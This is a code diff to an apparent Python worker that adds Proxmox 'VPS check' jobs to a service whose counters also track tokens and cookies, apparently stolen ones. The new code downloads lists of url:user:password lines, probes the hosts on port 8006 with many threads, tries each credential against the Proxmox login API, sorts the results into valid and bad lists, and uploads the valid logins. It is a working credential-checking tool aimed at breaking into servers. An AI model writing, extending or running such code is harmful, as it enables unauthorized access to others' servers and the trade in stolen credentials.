@@ -1791,14 +1791,243 @@ def finish(task, stage, **extra):
                              "tk_prem", "tk_2fa", "tk_frozen", "tk_dead",
                              "tk_err", "tk_zip", "tk_proxies", "tk_link",
                              "ck_total", "ck_live", "ck_prem", "ck_free",
-                             "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies")})
+                             "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies",
+                             "total", "reach", "unreach", "invalid", "sent",
+                             "valid", "bad", "errors")})
     payload["pubs"] = PB[3]
     report(payload)
     PB[1] = None
 
+
+def _vps_parse_line(line):
+    line = (line or "").strip()
+    if not line or ":8006" not in line:
+        return None
+    parts = line.rsplit(":", 2)
+    if len(parts) != 3:
+        return None
+    url, user, pwd = (p.strip() for p in parts)
+    if not url or not user or "8006" not in url:
+        return None
+    return (url, user, pwd, line)
+
+def _vps_reach_one(entry):
+    url, user, pwd, raw = entry
+    base = url.rstrip()
+    try:
+        r = requests.get(base, timeout=8, verify=False, allow_redirects=True,
+                         headers={"User-Agent": "Mozilla/5.0"})
+        return (entry, True, r.status_code)
+    except Exception as e:
+        pass
+    try:
+        import urllib.parse
+        pu = urllib.parse.urlsplit(base)
+        host = pu.hostname
+        port = pu.port or (443 if pu.scheme == "https" else 80)
+        so = socket.create_connection((host, port), timeout=8)
+        so.close()
+        return (entry, True, 0)
+    except Exception as e:
+        return (entry, False, str(e)[:80])
+
+def _vps_is_proxmox(base):
+    base = base.rstrip()
+    try:
+        r = requests.get(base + "/api2/json/version", timeout=10, verify=False,
+                         headers={"User-Agent": "Mozilla/5.0"})
+        if r.status_code == 200 and "version" in (r.text or ""):
+            return True
+    except Exception:
+        pass
+    try:
+        r = requests.get(base + "/", timeout=10, verify=False,
+                         headers={"User-Agent": "Mozilla/5.0"})
+        return "Proxmox Virtual Environment" in (r.text or "")
+    except Exception:
+        return False
+
+def _vps_check_one(entry):
+    url, user, pwd, raw = entry
+    base = url.rstrip()
+    if not _vps_is_proxmox(base):
+        return (entry, "error", "not proxmox or unreachable")
+    login_url = base + "/api2/json/access/ticket"
+    data = {"username": user, "password": pwd}
+    if "@" not in user:
+        data["realm"] = "pam"
+    try:
+        r = requests.post(login_url, data=data, timeout=15, verify=False,
+                          headers={"User-Agent": "Mozilla/5.0"})
+    except Exception as e:
+        return (entry, "error", str(e)[:80])
+    msg = ""
+    try:
+        j = r.json()
+        if isinstance(j, dict):
+            msg = j.get("message") or ""
+            if j.get("data") and isinstance(j["data"], dict) and j["data"].get("ticket"):
+                return (entry, "valid", "OK")
+    except Exception:
+        msg = (r.text or "")[:80]
+    low = (msg or "").lower()
+    if r.status_code in (401, 403) or "authentication failure" in low or "invalid" in low or "no such user" in low:
+        return (entry, "bad", msg or "authentication failure")
+    if r.status_code == 200 and not msg:
+        return (entry, "bad", "no ticket returned")
+    return (entry, "error", ("HTTP %s: %s" % (r.status_code, msg))[:100])
+
+def vps_promox_job(task):
+    global CHAT
+    CHAT = task.get("chat")
+    PB[0], PB[2], PB[3] = 0.0, time.time(), 0
+    PB[1] = task.get("msg")
+    st("queued", 0, job=task.get("job"), vm=SPECS)
+    url = task.get("url")
+    try:
+        st("download", 5, job=task.get("job"), vm=SPECS)
+        r = requests.get(url, timeout=120, verify=False,
+                         headers={"User-Agent": "Mozilla/5.0"})
+        r.raise_for_status()
+        text = r.text
+    except Exception as e:
+        finish(task, "error", err="download failed: %s" % str(e)[:80]); return
+    entries = []; invalid = []; seen = set()
+    for ln in text.splitlines():
+        if ":8006" not in ln:
+            continue
+        parsed = _vps_parse_line(ln)
+        if parsed is None:
+            invalid.append(ln.strip()); continue
+        if parsed[3] in seen:
+            continue
+        seen.add(parsed[3]); entries.append(parsed)
+    total = len(entries)
+    if total == 0:
+        finish(task, "error", err="no :8006 lines found"); return
+    st("scan", 10, job=task.get("job"), vm=SPECS, log_files=total,
+       scanned=0, sessions=0, cores=SPECS.get("cores", 1),
+       workers=min(50, total))
+    results = [None] * total
+    done = [0]; reachable = [0]
+    def _w(i):
+        rr = _vps_reach_one(entries[i]); results[i] = rr; return rr
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    with ThreadPoolExecutor(max_workers=min(50, max(1, total))) as ex:
+        futs = {ex.submit(_w, i): i for i in range(total)}
+        for fut in as_completed(futs):
+            i = futs[fut]
+            try:
+                rr = fut.result()
+            except Exception as e:
+                rr = (entries[i], False, str(e)[:60]); results[i] = rr
+            done[0] += 1
+            if rr[1]:
+                reachable[0] += 1
+            if done[0] % 5 == 0 or done[0] == total:
+                pct = 10 + int(done[0] / max(total, 1) * 80)
+                st("scan", pct, job=task.get("job"), vm=SPECS, log_files=total,
+                   scanned=done[0], sessions=reachable[0],
+                   cores=SPECS.get("cores", 1), workers=min(50, total))
+    reach_list = [r for r in results if r and r[1]]
+    unreach_list = [r for r in results if r and not r[1]]
+    (OUT / "reachable.txt").write_text(
+        "".join(r[0][3] + "\n" for r in reach_list), encoding="utf-8")
+    (OUT / "unreachable.txt").write_text(
+        "".join(r[0][3] + "  # " + str(r[2]) + "\n" for r in unreach_list),
+        encoding="utf-8")
+    (OUT / "all.txt").write_text(
+        "".join(r[0][3] + "\n" for r in results if r), encoding="utf-8")
+    if invalid:
+        (OUT / "invalid.txt").write_text(
+            "".join(x + "\n" for x in invalid), encoding="utf-8")
+    sent = 0
+    for fname in ("reachable.txt", "unreachable.txt", "all.txt", "invalid.txt"):
+        fp = OUT / fname
+        if fp.exists() and fp.stat().st_size > 0:
+            if upload(str(fp), fname):
+                sent += 1
+    finish(task, "done", total=total, reach=len(reach_list),
+           unreach=len(unreach_list), invalid=len(invalid), sent=sent)
+
+def vps_check_job(task):
+    global CHAT
+    CHAT = task.get("chat")
+    PB[0], PB[2], PB[3] = 0.0, time.time(), 0
+    PB[1] = task.get("msg")
+    st("queued", 0, job=task.get("job"), vm=SPECS)
+    text = task.get("content") or ""
+    entries = []
+    seen = set()
+    for ln in text.splitlines():
+        ln = ln.strip()
+        if not ln or ln.startswith("#"):
+            continue
+        parsed = _vps_parse_line(ln)
+        if parsed is None:
+            continue
+        if parsed[3] in seen:
+            continue
+        seen.add(parsed[3]); entries.append(parsed)
+    total = len(entries)
+    if total == 0:
+        finish(task, "error", err="no valid url:user:pass lines"); return
+    st("scan", 10, job=task.get("job"), vm=SPECS, log_files=total,
+       scanned=0, sessions=0, cores=SPECS.get("cores", 1),
+       workers=min(15, total))
+    results = [None] * total
+    MAX_TRY = 3
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    pending = list(range(total))
+    for seed in range(MAX_TRY):
+        if not pending:
+            break
+        def _w(i):
+            return _vps_check_one(entries[i])
+        with ThreadPoolExecutor(max_workers=min(15, max(1, len(pending)))) as ex:
+            futs = {ex.submit(_w, i): i for i in pending}
+            for fut in as_completed(futs):
+                i = futs[fut]
+                try:
+                    results[i] = fut.result()
+                except Exception as e:
+                    results[i] = (entries[i], "error", "thread crash: %s" % str(e)[:40])
+                done = sum(1 for r in results if r)
+                pct = 10 + int(done / max(total, 1) * 80)
+                st("scan", pct, job=task.get("job"), vm=SPECS, log_files=total,
+                   scanned=done, sessions=0, cores=SPECS.get("cores", 1),
+                   workers=min(15, total))
+        pending = [i for i in range(total) if results[i] and results[i][1] == "error"]
+    for i, r in enumerate(results):
+        if r is None:
+            r = (entries[i], "error", "no result"); results[i] = r
+    valid = [r for r in results if r[1] == "valid"]
+    bad = [r for r in results if r[1] == "bad"]
+    errors = [r for r in results if r[1] == "error"]
+    (OUT / "valid.txt").write_text("".join(r[0][3] + "\n" for r in valid), encoding="utf-8")
+    (OUT / "bad.txt").write_text("".join(r[0][3] + "\n" for r in bad), encoding="utf-8")
+    (OUT / "error.txt").write_text("".join(r[0][3] + "\n" for r in errors), encoding="utf-8")
+    (OUT / "all.txt").write_text("".join(r[0][3] + "\n" for r in results), encoding="utf-8")
+    report_txt = ("VPS / PROXMOX CHECK REPORT\n" +
+                  "Total: %d\nValid: %d\nBad: %d\nErrors: %d\n" % (total, len(valid), len(bad), len(errors)))
+    (OUT / "report.txt").write_text(report_txt, encoding="utf-8")
+    sent = 0
+    for fname in ("valid.txt", "bad.txt", "error.txt", "all.txt", "report.txt"):
+        fp = OUT / fname
+        if fp.exists() and fp.stat().st_size > 0:
+            if upload(str(fp), fname):
+                sent += 1
+    finish(task, "done", total=total, valid=len(valid), bad=len(bad),
+           errors=len(errors), sent=sent)
+
 def process(task):
     """Run one job inside this long-lived VM."""
     global DOMS, CHAT
+    kind = task.get("kind")
+    if kind == "vps_promox":
+        vps_promox_job(task); return
+    if kind == "vps_check":
+        vps_check_job(task); return
     DOMS = [d.lower() for d in task.get("domains") or []]
     CHAT = task.get("chat")
     PB[0], PB[2], PB[3] = 0.0, time.time(), 0
